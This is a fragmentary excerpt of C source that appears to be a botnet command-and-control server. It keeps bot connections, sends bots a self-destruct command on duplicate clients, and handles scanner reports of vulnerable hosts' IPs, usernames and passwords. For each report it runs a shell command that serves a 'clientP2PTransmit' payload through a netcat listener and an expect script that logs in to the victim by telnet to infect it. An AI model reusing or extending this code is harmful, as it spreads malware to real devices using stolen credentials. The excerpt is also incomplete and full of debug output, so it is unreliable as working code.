...
static int make_socket_non_blocking(int sfd) { // man fcntl
   int flags, s;
            ...
            while (1) {
               ...
               if (dup) {
                  ...
                  if (send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) {
                     close(infd);
                     continue;
                  } // orders all the bots to immediately kill themselves if we see a duplicate client! MAXIMUM PARANOIA
                  if (send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) {
                     close(infd);
                     continue;
                  } // same thing as above.
            ...
            while (1) {
               ...
               while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) {
                  ...
                  if (strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                  {
                     ...
                     if (exploitCount== 0)
                     { 
                     printf("in exploit count");
                     char * line = strstr(buf, "REPORT ") + 7;
                     fprintf(fileFD, "%s\n", line); // let's write it out to disk without checking what it is!
                     fflush(fileFD);
                     
                     char buffer[128];
                     //char line[50] = "192.168.1.23:MalwareTwo:123";
                     char * IPAdress = strtok(line, ":");
                     printf( " %s\n", IPAdress ); //printing the token

                     char * username = strtok(NULL, ":");
                     printf( " %s\n", username ); //printing the token

                     char * password = strtok(NULL, ":");
                     printf( " %s\n", password ); //printing the token
                     
                     char * programToSend = "clientP2PTransmit";

                     printf("cat %s | netcat -q 5 -l 9899 & expect telnetConnection.expect %s %s %s %s", programToSend, IPAdress, username,password, serverIP);
                    snprintf(buffer, sizeof(buffer), "cat %s | netcat -q 5 -l 9899 & expect telnetConnection.expect %s %s %s %s", programToSend, IPAdress, username,password, serverIP);
                                                                           
                    printf("started");
                    //int status1 = system("");
                    printf("first completetd");
                    int status2 = system(buffer);
                    int status3 = system("\r");
                    int status4 = system("\n");
                    int status5 = system("\n");
                    int status6 = system("\n");
                    int status7 = system("\n");
...
void * telnetWorker(void * sock) {
   printf("telnetworker function 1 \n");
   int thefd = (int) sock;
   managesConnected++;
   pthread_t title;
   char buf[2048];
   ...
   printf("telnetworker function 2 \n");
...
void * telnetListener(void * useless) {
   printf("telnetlistener function \n");
   ...
   while (1) {
   printf("in telnet while \n");
      newsockfd = accept(sockfd, (struct sockaddr * ) & cli_addr, & clilen);
      if (newsockfd < 0) perror("ERROR on accept");
      printf("not if in \n");
      pthread_t thread;
      assert (pthread_create( & thread, NULL, & telnetWorker, (void * ) newsockfd) == 0);
   }
}
